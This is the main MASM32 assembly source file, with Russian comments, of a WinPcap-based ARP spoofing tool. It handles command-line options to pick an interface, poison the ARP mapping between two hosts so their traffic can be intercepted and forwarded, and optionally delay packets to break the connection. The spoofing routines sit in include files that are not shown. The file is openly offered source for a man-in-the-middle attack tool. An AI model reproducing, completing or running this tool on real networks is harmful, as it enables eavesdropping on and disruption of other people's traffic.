; Скачай и установи в  
; C:\Program Files\WinPcap библиотеку WinPcap_4_1_2.exe
; с сайта http://www.winpcap.org/  
;
; Доки к библиотеке на 
; http://www.winpcap.org/docs/docs_41/html/group__wpcapfunc.html
.386
.model 		flat,stdcall
option 		casemap:none
include		\masm32\include\windows.inc
include		\masm32\include\kernel32.inc
include		\masm32\include\masm32.inc
include		\masm32\include\user32.inc
include		\masm32\include\wsock32.inc
include		\masm32\include\msvcrt.inc
include		\masm32\include\IpHlpApi.inc

; wpcap.inc, packet.inc, wpcap.lib, packet.lib - http://www.asmfr.com//code.aspx?ID=48163
include		..\packet\packet.inc
include		..\wpcap\wpcap.inc

; Stdlib.inc, Stdlib.lib, Stdlib.mac - "COPYRIGHT (C) BY DRIZZ http://drizz.has.it/"
; getseg.inc, getseg.lib - "GetSeg Library by Digital Monkey 
;				http://www.wasm.ru/baixado.php?mode=src&id=178"
include		..\Stdlib\Stdlib.inc	
include		..\getseg\getseg.inc
	
include		..\Stdlib\Stdlib.mac

includelib	\masm32\lib\kernel32.lib
includelib	\masm32\lib\masm32.lib
includelib	\masm32\lib\user32.lib
includelib	\masm32\lib\wsock32.lib
includelib	\masm32\lib\msvcrt.lib
includelib	\masm32\lib\IpHlpApi.lib

includelib	..\packet\packet.lib
includelib	..\wpcap\wpcap.lib
 
includelib	..\Stdlib\Stdlib.lib
includelib	..\getseg\getseg.lib

; Объявим некоторые "удобные" функции из библиотеки msvcrt
memset		proto c:DWORD, :DWORD, :DWORD 
memcpy		proto c:DWORD, :DWORD, :DWORD 
memcmp		proto c:DWORD, :DWORD, :DWORD 
strcmp		proto c:DWORD, :DWORD
atoi		proto c:DWORD
malloc		proto c:DWORD
free		proto c:DWORD

param_i		proto :DWORD 	; Функция обработки параметра  "-i"
InitARPSpoof	proto
StartARPSpoof	proto
GetLocalIP	proto :DWORD
GetLocalMAC	proto :DWORD, :DWORD
SpoofThread	proto :DWORD
SpoofInfo		proto :DWORD
SendingARP	proto :DWORD
ResetSpoof	proto
CtrlHandler	proto :DWORD
pcap_loop		proto :DWORD, :DWORD, :DWORD, :DWORD
packet_handler	proto :DWORD, :ptr pcap_pkthdr, :ptr byte
ForwardPacket	proto :DWORD, :ptr byte, :DWORD

show_error	proto :DWORD 	; Форматированый вывод ошибок
show_help		proto		; Вывод строки инфо. об использовании проги
StaticARP		proto :DWORD, :DWORD; Функция	установки локального ARP - соответствия
GetMAC		proto :DWORD, :DWORD; Функция	считывания MAC адреса по IP адресу хоста 
Print_MAC		proto :DWORD

.const
	OID_802_3_PERMANENT_ADDRESS	equ 1010101h
	OID_802_3_CURRENT_ADDRESS	equ 1010102h
.data
align 4
	ARPSPOOF	struct 
		ucSelfMAC		db 6 dup(0)	; self MAC
		szTarget		db 16 dup(0)	; target IP Address
		ucTargetMAC	db 6 dup(0)	; target MAC
		szIP		db 16 dup(0)	; IP2's IP
		ucIPMAC		db 6 dup(0)	; IP2's TRUE MAC used to restor local arp cache
		ucPretendMAC	db 6 dup(0)	; IP2's Pretend MAC
		hInterface	dd 0
		szSelfIP		db 16 dup(0)	; mySelf IP
	ARPSPOOF	ends

	arpspoof	ARPSPOOF <>	

	PACKET_OID_DATA struct
		Oid	DWORD 0
		Lengthz	DWORD 0
		Dataz	BYTE 256 dup( 0 ) 
	PACKET_OID_DATA ends

	commstr			db '> ',0		; Символ приглашение работы с консолью
	szformat 			db '%hS',0	; Шаблон  
	szformatNb		db '%d',0		; Шаблон  
	szformatNb1		db ' param = %d',13,10,0; Шаблон  
	szformatMAC		db '%.02X:%.02X:%.02X:%.02X:%.02X:%.02X',0 ; Шаблон для MAC адреса 
	ParOpen			db ' [',0
	ParClose			db '] ',0

	szhelper	db ' Usage: arpspoof [-h] -i [[N] [-t M] [-s IP_A IP_B ]]',13,10,\
		'	-h - show help',13,10,\
		'	-i - output list of interfaces',13,10,0
	szhelper1	db	'	 N - number of intresting interface',13,10,\
		'	-s IP_A IP_B - listen to the traffic from A up to B and back',13,10,\
		'	-t M - whis M msec of waiting of sending answer',13,10,\
		'	   (if set M>= 250 its will be a down of connection)',13,10,0

	szerror_i			db 'param -i',13,10,0 ; Ошибка параметра "-i"
	szerror_s			db 'param -s',13,10,0 ; Ошибка параметра "-s"
	szerror_t			db 'param -t',13,10,0 ; Ошибка параметра "-t"
	szerror_template		db '[-] Error in %s',0 ; Формат ошибок параметров 
	szparam_s			db '-s ',0
	szErrOpenDev 		db 'Unable to open the adapter.',0
	crlf			db 13,10,0
	szErrpcap_findalldevs 	db '[-] Error in pcap_findalldevs',0
	DevSelection		dd 0
	DevCounter		dd 0
	compteur			dd 0

	errbuf			db [PCAP_ERRBUF_SIZE] dup (0)
	buff			db [MAX_PATH] 	dup (0)

	dwTimeWait		dd 0


	hThread1			dd 0
	hThread2			dd 0
	dwCode1			dd 0
	dwCode2			dd 0

	pMemory			dd 0
	pMemory2			dd 0
.data?
; Идентификатор интерфейса
	adhandle			pcap_t	<?>
	alldevs 			pcap_if_t	<?>

;-------------------------------------------------------------------
; Самое время подключить inc - и разбора параметров и функции их обработки ))
include		functs.inc
include		params.inc

;-------------------------------------------------------------------
.code
;===================================================================
;===================================================================
;===================================================================
; Функция start
;
start:
; Получаем перечень доступных сетевых интерфейсов для выбора 
	invoke	pcap_findalldevs,addr alldevs,addr errbuf
	.if (eax == -1)
		invoke	StdOut, addr szErrpcap_findalldevs							
	.endif

	assume	ecx:ptr pcap_if
	mov	ecx,alldevs
	mov	DevCounter,1
	; Переменная DevCounter получит число доступных сетевых интерфейсов
	@@:
	push	ecx
	.if	([ecx].next)
		invoke	StdOut, addr crlf
		pop	ecx
		mov	ecx,[ecx].next
		inc	DevCounter
		jmp	@B
	.else
		pop	ecx
	.endif  

	; Начнем разбор ком. строки
	invoke	ParamStr, 1, addr buff, 128	; Считаем "-i"
	lea	edi, buff
	;---------------------------------------------------------------
	cmp	word ptr[edi], 'h-'	; Пользователь выбрал "-h". 
	jne	@F
	invoke	show_help		;Выведем ему информацию по использования прожки.						
	jmp	__Exit	
	;---------------------------------------------------------------
@@:	lea	edi, buff
	cmp	word ptr[edi], 'i-'	; Пользователь выбрал "-i". 
	je	@F
	invoke	show_error,addr szerror_i	;Ecли первый параметр не "-i" - то имеем проблему.
					; Мы ведь не можем работать с никаким сетевым интерфейсом )	 
	jmp	__Exit	
	;---------------------------------------------------------------
@@:	invoke	ParamCount	; В eax - количество параметров ком. строки
	xor	ecx,ecx	
	mov	compteur,eax	; Сохраним ее в [compteur]
	.while	ecx !=compteur	; Увеличиваем усч до тех пор пока усч не станет равно [compteur]
		inc	ecx
		push	ecx

		invoke	ParamStr, ecx, addr buff, MAX_PATH	; Считаем в buff ком. строку
		lea	edi, buff
		;---------------------------------------------------------------
		cmp	word ptr[edi], 'i-'	; Пользователь выбрал "-i"? 
		jne	@F
					; Считаем "N" -номер интерфейса с которым хотим работать
		invoke	ParamStr, ecx, addr buff, MAX_PATH
		invoke	atoi, addr buff	
		.if	eax != 0
			.if	eax <= DevCounter	; Если пользователь ввел по ошибке номер интерфейса 
						; больше чем нам доступно на этой машине, 
						; то обработаем тут такую ошибку
				mov	DevSelection, eax	; Сохраним номер выбранного интерфейса 
							; в переменной "DevSelection"
				invoke	param_i, eax	; Работаем с параметром "-i N"
			.else
				; Выведем сообщ. об ошибке в параметре "-i" 
				invoke	show_error,addr szerror_i 
				jmp	__Exit	
			.endif
			jmp	__next
		.else
			invoke	param_i, 0	; Если пользователь не ввел 
						; номер интересующего интерфейса, то выведем ему 
						; перечень всех интерфейсов, пусть выберет.
			.break
		.endif
		;---------------------------------------------------------------
	@@:	cmp	word ptr[edi], 't-'	; Пользователь выбрал "-t". 
		jne	@F
		pop	ecx		; Считаем "M" - величину задержки в милисек.
		inc	ecx		; для организации понижения скорости обмена
		push	ecx		; между хостами

		invoke	ParamStr, ecx, addr buff, MAX_PATH	; Считаем "N" -количества повторений 
							; при отсылке пакета 
		invoke    atoi, addr buff
		.if	eax !=0
			invoke	atodw, addr buff		; Преобразуем номер "M" в цифру 
			mov	dword ptr [dwTimeWait], eax	; Занесем это число в переменную [dwTimeWait]
			jne	__next
		.else
			mov	dword ptr [dwTimeWait], -1	; Иначе поместим в нее -1 признак того 
							; что задержки не будет
			jne	__next
		.endif

		;---------------------------------------------------------------

	@@:	cmp	word ptr[edi], 's-'	; Пользователь выбрал "-s". 
		jne	__next
		pop	ecx
		inc	ecx
		push	ecx

		assume	esi:ptr ARPSPOOF
		lea	esi,arpspoof
		invoke	ParamStr, ecx, addr buff, MAX_PATH	; Считываем 1-е значение параметра "-s".
							; Это должен быть IP - адрес отправителя пакета.
							; Сохраним его в [buff]

		.if	ecx == 0			; Если его нет то выводим сообщение об ошибке в параметре "-s".
			invoke	show_error,addr szerror_s 
			jmp	__Exit
		.else
			invoke	inet_addr,addr buff	; Проверим валидность IP - адреса и если все ОК, 
						; то передаем его в функцию обработку параметра. 
			.if	eax==INADDR_NONE
				; Если IP-адрес неверен, то выводим сообщение об ошибке в параметре "-s".  
				invoke	show_error,addr szerror_s	
			.else
				lea	eax,[esi].szIP
				invoke	lstrcpyn, eax, addr buff,16
			.endif
		.endif
		pop	ecx
		inc	ecx
		push	ecx
		invoke	ParamStr, ecx, addr buff, MAX_PATH	; Считываем 2-е значение параметра "-s".
							; Это должен быть IP - адрес получателя пакета.
							; Сохраним его в [buff1]
		.if	ecx == 0			; Если его нет то выводим сообщение об ошибке в параметре "-s".
			invoke	show_error,addr szerror_s
			jmp	__Exit
		.else
			invoke	inet_addr, addr buff	; Проверим валидность IP - адреса и если все ОК, 
						; то передаем его в функцию обработку параметра. 
			.if	eax==INADDR_NONE
				invoke	show_error,addr szerror_s	; Если IP-адрес неверен, то выводим 
			.else
				lea	eax,[esi].szTarget
				invoke	lstrcpyn, eax, addr buff,16	; сообщение об ошибке в параметре "-s".  
			.endif
		.endif
		;---------------
		invoke	SetConsoleCtrlHandler, addr CtrlHandler, TRUE
		invoke	InitARPSpoof
		.if	eax !=0
			;	; Показать сообщение
			jmp	__Exit
		.endif				
			
		invoke	StartARPSpoof
		.if	eax !=0
			;	; Показать сообщение
			jmp	__Exit
		.endif

		lea	esi,arpspoof
		invoke	pcap_loop, adhandle, 0, offset packet_handler, NULL
		jmp	__Exit
		;---------------------------------------------------------------
	__next:	pop	ecx
	.endw
__Exit:	invoke	pcap_freealldevs,alldevs
	add	esp, 4*1
	invoke	ExitProcess,0
;===================================================================
;===================================================================
;===================================================================
end start	